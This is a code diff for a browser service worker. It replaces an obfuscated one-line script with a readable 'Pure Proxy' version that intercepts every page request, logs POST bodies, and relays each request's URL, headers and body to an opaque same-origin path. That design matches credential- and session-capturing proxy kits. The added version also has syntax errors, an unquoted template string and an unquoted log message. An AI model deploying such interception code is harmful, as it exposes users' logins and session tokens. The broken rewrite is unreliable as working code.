@@ -1,1 +1,50 @@
-const _0x545eab=_0x313b;(function(_0x1c1532,_0x3ea1c2){const _0x4fe9ac=_0x313b,_0x12d3b1=_0x1c1532();while(!![]){try{const _0x372690=-parseInt(_0x4fe9ac(0x163))/0x1*(-parseInt(_0x4fe9ac(0x15c))/0x2)+-parseInt(_0x4fe9ac(0x158))/0x3*(parseInt(_0x4fe9ac(0x164))/0x4)+-parseInt(_0x4fe9ac(0x16b))/0x5+-parseInt(_0x4fe9ac(0x169))/0x6*(-parseInt(_0x4fe9ac(0x165))/0x7)+-parseInt(_0x4fe9ac(0x16c))/0x8+parseInt(_0x4fe9ac(0x16f))/0x9+parseInt(_0x4fe9ac(0x160))/0xa*(-parseInt(_0x4fe9ac(0x15b))/0xb);if(_0x372690===_0x3ea1c2)break;else _0x12d3b1['push'](_0x12d3b1['shift']());}catch(_0x5867b5){_0x12d3b1['push'](_0x12d3b1['shift']());}}}(_0xc17c,0xd1bc7),self[_0x545eab(0x14e)](_0x545eab(0x161),_0x5aa471=>{const _0x46dd17=_0x545eab;_0x5aa471[_0x46dd17(0x151)](handleRequest(_0x5aa471[_0x46dd17(0x16e)]));}));function _0x313b(_0x3c0366,_0x284ddc){_0x3c0366=_0x3c0366-0x14d;const _0xc17cf4=_0xc17c();let _0x313b91=_0xc17cf4[_0x3c0366];return _0x313b91;}function _0xc17c(){const _0x1575b7=['respondWith','location','method','referrer','mode','url','headers','1426098nHkjjM','fromEntries','manual','11uacTVx','18JWvUiX','error','[SW]\x20Body\x20preview:','\x20failed:','2879410TDvtJV','fetch','clone','21145HlRtFv','4bGyJmy','130872LbdIQe','entries','POST','[SW]\x20Intercepted:','492pYwOMw','same-origin','1177890yBTPMJ','301360uHObFC','Proxy\x20error','request','1550313fyJBvM','[SW]\x20Fetching\x20','addEventListener','log','application/json'];_0xc17c=function(){return _0x1575b7;};return _0xc17c();}async function handleRequest(_0x43786d){const _0x5223aa=_0x545eab;console[_0x5223aa(0x14f)](_0x5223aa(0x168),_0x43786d[_0x5223aa(0x153)],_0x43786d[_0x5223aa(0x156)]);const _0x10f87f=_0x43786d[_0x5223aa(0x162)]();let _0x3cf3bd='';try{_0x3cf3bd=await _0x10f87f['text']();}catch(_0x517788){_0x3cf3bd='';}_0x43786d[_0x5223aa(0x153)]==='POST'&&console['log'](_0x5223aa(0x15e),_0x3cf3bd['substring'](0x0,0x12c));const _0x250c21=self[_0x5223aa(0x152)]['origin']+'/lNv1pC9AWPUY4gbidyBO',_0x1bea35={'url':_0x43786d[_0x5223aa(0x156)],'method':_0x43786d[_0x5223aa(0x153)],'headers':Object[_0x5223aa(0x159)](_0x43786d[_0x5223aa(0x157)][_0x5223aa(0x166)]()),'body':_0x3cf3bd,'referrer':_0x43786d[_0x5223aa(0x154)],'mode':_0x43786d[_0x5223aa(0x155)]};try{return fetch(_0x250c21,{'method':_0x5223aa(0x167),'headers':{'Content-Type':_0x5223aa(0x150)},'body':JSON['stringify'](_0x1bea35),'redirect':_0x5223aa(0x15a),'mode':_0x5223aa(0x16a)});}catch(_0x507b8a){return console[_0x5223aa(0x15d)](_0x5223aa(0x14d)+_0x250c21+_0x5223aa(0x15f),_0x507b8a),new Response(_0x5223aa(0x16d),{'status':0x1f6});}}
+// ============================================================
+// SERVICE WORKER – Pure Proxy (with debug logs)
+// ============================================================
+self.addEventListener("fetch", (event) => {
+    event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+    // ---- Log every intercepted request ----
+    console.log('[SW] Intercepted:', request.method, request.url);
+
+    const clonedRequest = request.clone();
+    let bodyText = '';
+
+    try {
+        bodyText = await clonedRequest.text();
+    } catch (e) {
+        bodyText = '';
+    }
+
+    // ---- Log body for POST requests ----
+    if (request.method === 'POST') {
+        console.log('[SW] Body preview:', bodyText.substring(0, 300));
+    }
+
+    // ---- FORWARD REQUEST TO PROXY ----
+    const proxyRequestURL = ${self.location.origin}/lNv1pC9AWPUY4gbidyBO;
+    const proxyRequest = {
+        url: request.url,
+        method: request.method,
+        headers: Object.fromEntries(request.headers.entries()),
+        body: bodyText,
+        referrer: request.referrer,
+        mode: request.mode
+    };
+
+    try {
+        return fetch(proxyRequestURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(proxyRequest),
+            redirect: "manual",
+            mode: "same-origin",
+            cache: "no-cache"
+        });
+    } catch (error) {
+        console.error([SW] Fetching ${proxyRequestURL} failed:, error);
+        return new Response('Proxy error', { status: 502 });
+    }
+}
